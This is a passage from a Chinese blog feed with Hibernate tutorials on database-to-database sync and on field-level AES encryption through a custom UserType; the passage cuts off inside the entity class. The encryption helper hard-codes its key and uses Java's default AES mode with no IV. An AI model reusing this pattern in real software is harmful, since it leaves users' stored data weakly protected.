<p>首先，创建两个Hibernate配置文件，分别用于源数据库和目标数据库的连接。</p>
<h4 data-id="heading-1"><code>hibernate_source.cfg.xml</code>（源数据库配置文件）</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span> <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/source_db<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>source_user<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>source_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>validate<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-2"><code>hibernate_target.cfg.xml</code>（目标数据库配置文件）</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span> <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/target_db<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>target_user<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>target_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h3 data-id="heading-3">2. 创建实体类</h3>
<p>创建两个实体类分别对应源数据库和目标数据库中的表。</p>
<h4 data-id="heading-4"><code>SourceEntity.java</code>（源数据库实体类）</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "source_table")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SourceEntity</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String dataField;
    <span class="hljs-keyword">private</span> String timestamp;

    <span class="hljs-comment">// Getters and setters</span>
}
</code></pre>
<h4 data-id="heading-5"><code>TargetEntity.java</code>（目标数据库实体类）</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "target_table")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TargetEntity</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String dataField;
    <span class="hljs-keyword">private</span> String timestamp;

    <span class="hljs-comment">// Getters and setters</span>
}
</code></pre>
<h3 data-id="heading-6">3. 编写数据同步流程</h3>
<p>编写数据同步流程来提取、转换和加载数据。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataSync</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// Configure Hibernate for source database</span>
        <span class="hljs-type">Configuration</span> <span class="hljs-variable">sourceConfig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate_source.cfg.xml"</span>);
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sourceSessionFactory</span> <span class="hljs-operator">=</span> sourceConfig.buildSessionFactory();

        <span class="hljs-comment">// Configure Hibernate for target database</span>
        <span class="hljs-type">Configuration</span> <span class="hljs-variable">targetConfig</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate_target.cfg.xml"</span>);
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">targetSessionFactory</span> <span class="hljs-operator">=</span> targetConfig.buildSessionFactory();

        <span class="hljs-comment">// Extract Data from source database</span>
        <span class="hljs-type">Session</span> <span class="hljs-variable">sourceSession</span> <span class="hljs-operator">=</span> sourceSessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">sourceTransaction</span> <span class="hljs-operator">=</span> sourceSession.beginTransaction();
        List&lt;SourceEntity&gt; sourceData = sourceSession.createQuery(<span class="hljs-string">"FROM SourceEntity"</span>, SourceEntity.class).list();
        sourceTransaction.commit();
        sourceSession.close();

        <span class="hljs-comment">// Transform Data</span>
        List&lt;TargetEntity&gt; transformedData = transformData(sourceData);

        <span class="hljs-comment">// Sync Data to target database</span>
        <span class="hljs-type">Session</span> <span class="hljs-variable">targetSession</span> <span class="hljs-operator">=</span> targetSessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">targetTransaction</span> <span class="hljs-operator">=</span> targetSession.beginTransaction();
        <span class="hljs-keyword">for</span> (TargetEntity targetEntity : transformedData) {
            targetSession.saveOrUpdate(targetEntity);
        }
        targetTransaction.commit();
        targetSession.close();

        sourceSessionFactory.close();
        targetSessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;TargetEntity&gt; <span class="hljs-title function_">transformData</span><span class="hljs-params">(List&lt;SourceEntity&gt; sourceData)</span> {
        <span class="hljs-comment">// Example transformation logic</span>
        <span class="hljs-keyword">return</span> sourceData.stream()
                .map(sourceEntity -&gt; {
                    <span class="hljs-type">TargetEntity</span> <span class="hljs-variable">targetEntity</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TargetEntity</span>();
                    targetEntity.setDataField(sourceEntity.getDataField());
                    targetEntity.setTimestamp(sourceEntity.getTimestamp());
                    <span class="hljs-keyword">return</span> targetEntity;
                })
                .toList();
    }
}
</code></pre>
<h3 data-id="heading-7">4. 运行数据同步流程</h3>
<p>编译并运行上面的Java代码，它将连接到源数据库，提取数据，对数据进行转换，并将这些数据同步到目标数据库。</p>
<h3 data-id="heading-8">例子解释</h3>
<ol>
<li><strong>Hibernate配置：</strong> 配置两个Hibernate配置文件，分别用于源数据库和目标数据库的连接。</li>
<li><strong>实体类：</strong> 创建对应源数据表和目标数据表的实体类。</li>
<li><strong>数据同步流程：</strong>
<ul>
<li><strong>抽取（Extract）：</strong> 从源数据库中提取数据。</li>
<li><strong>转换（Transform）：</strong> 对提取的数据进行转换。</li>
<li><strong>加载（Load）：</strong> 将转换后的数据同步到目标数据库中。</li>
</ul>
</li>
</ol>
<p>通过以上配置和代码示例，我们展示了如何在数据同步过程中使用Hibernate。这个示例包括如何配置Hibernate、如何定义实体类以及如何编写数据同步流程，帮助你实现从源数据库到目标数据库的数据同步。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（82）如何在数据加密中使用Hibernate？]]></title>    <link>https://juejin.cn/post/7602401081265897508</link>    <guid>https://juejin.cn/post/7602401081265897508</guid>    <pubDate>2026-02-03T12:13:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602401081265897508" data-draft-id="7602401081265881124" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（82）如何在数据加密中使用Hibernate？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-03T12:13:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（82）如何在数据加密中使用Hibernate？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T12:13:00.000Z" title="Tue Feb 03 2026 12:13:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在数据加密过程中使用Hibernate，可以确保敏感数据在存储到数据库时得到加密处理，从而提高数据的安全性。以下是一个详细的示例，结合代码演示如何在数据加密过程中使用Hibernate。</p>
<h3 data-id="heading-0">1. 设置Hibernate配置</h3>
<p>创建一个Hibernate配置文件<code>hibernate.cfg.xml</code>，用于连接数据库。</p>
<h4 data-id="heading-1"><code>hibernate.cfg.xml</code></h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span> <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/encryption_db<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>db_user<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>db_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h3 data-id="heading-2">2. 创建加密和解密工具类</h3>
<p>实现一个简单的加密和解密工具类，使用Java的AES加密算法。</p>
<h4 data-id="heading-3"><code>EncryptionUtils.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.crypto.Cipher;
<span class="hljs-keyword">import</span> javax.crypto.KeyGenerator;
<span class="hljs-keyword">import</span> javax.crypto.SecretKey;
<span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;
<span class="hljs-keyword">import</span> java.util.Base64;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EncryptionUtils</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">ALGORITHM</span> <span class="hljs-operator">=</span> <span class="hljs-string">"AES"</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] KEY = <span class="hljs-string">"MySuperSecretKey"</span>.getBytes(); <span class="hljs-comment">// 应该使用更安全的密钥管理方式</span>

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">encrypt</span><span class="hljs-params">(String value)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">keySpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(KEY, ALGORITHM);
        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(ALGORITHM);
        cipher.init(Cipher.ENCRYPT_MODE, keySpec);
        <span class="hljs-type">byte</span>[] encryptedBytes = cipher.doFinal(value.getBytes());
        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(encryptedBytes);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">decrypt</span><span class="hljs-params">(String value)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">keySpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(KEY, ALGORITHM);
        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(ALGORITHM);
        cipher.init(Cipher.DECRYPT_MODE, keySpec);
        <span class="hljs-type">byte</span>[] decodedBytes = Base64.getDecoder().decode(value);
        <span class="hljs-type">byte</span>[] decryptedBytes = cipher.doFinal(decodedBytes);
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decryptedBytes);
    }
}
</code></pre>
<h3 data-id="heading-4">3. 创建自定义Hibernate类型</h3>
<p>创建一个自定义的Hibernate用户类型，用于处理加密字段的映射。</p>
<h4 data-id="heading-5"><code>EncryptedStringType.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.engine.spi.SharedSessionContractImplementor;
<span class="hljs-keyword">import</span> org.hibernate.usertype.UserType;

<span class="hljs-keyword">import</span> java.io.Serializable;
<span class="hljs-keyword">import</span> java.sql.PreparedStatement;
<span class="hljs-keyword">import</span> java.sql.ResultSet;
<span class="hljs-keyword">import</span> java.sql.SQLException;
<span class="hljs-keyword">import</span> java.sql.Types;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EncryptedStringType</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserType</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span>[] sqlTypes() {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]{Types.VARCHAR};
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Class <span class="hljs-title function_">returnedClass</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> String.class;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object x, Object y)</span> {
        <span class="hljs-keyword">return</span> x == <span class="hljs-literal">null</span> ? y == <span class="hljs-literal">null</span> : x.equals(y);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">(Object x)</span> {
        <span class="hljs-keyword">return</span> x.hashCode();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">nullSafeGet</span><span class="hljs-params">(ResultSet rs, String[] names, SharedSessionContractImplementor session, Object owner)</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> rs.getString(names[<span class="hljs-number">0</span>]);
        <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> EncryptionUtils.decrypt(value);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SQLException</span>(<span class="hljs-string">"Failed to decrypt value"</span>, e);
        }
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">nullSafeSet</span><span class="hljs-params">(PreparedStatement st, Object value, <span class="hljs-type">int</span> index, SharedSessionContractImplementor session)</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) {
            st.setNull(index, Types.VARCHAR);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">try</span> {
                st.setString(index, EncryptionUtils.encrypt((String) value));
            } <span class="hljs-keyword">catch</span> (Exception e) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SQLException</span>(<span class="hljs-string">"Failed to encrypt value"</span>, e);
            }
        }
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">deepCopy</span><span class="hljs-params">(Object value)</span> {
        <span class="hljs-keyword">return</span> value;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isMutable</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Serializable <span class="hljs-title function_">disassemble</span><span class="hljs-params">(Object value)</span> {
        <span class="hljs-keyword">return</span> (Serializable) value;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">assemble</span><span class="hljs-params">(Serializable cached, Object owner)</span> {
        <span class="hljs-keyword">return</span> cached;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">replace</span><span class="hljs-params">(Object original, Object target, Object owner)</span> {
        <span class="hljs-keyword">return</span> original;
    }
}
</code></pre>
<h3 data-id="heading-6">4. 创建实体类</h3>
<p>创建实体类并使用自定义的类型来对字段进行加密。</p>
<h4 data-id="heading-7"><code>User.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.annotations.Type;
<span class="hljs-keyword">import</span> org.hibernate.annotations.TypeDef;

<span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "users")</span>
<span class="hljs-meta">@TypeDef(name = "encryptedString", typeClass = EncryptedStringType.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {

    <span class="hljs-meta">@Id</span>
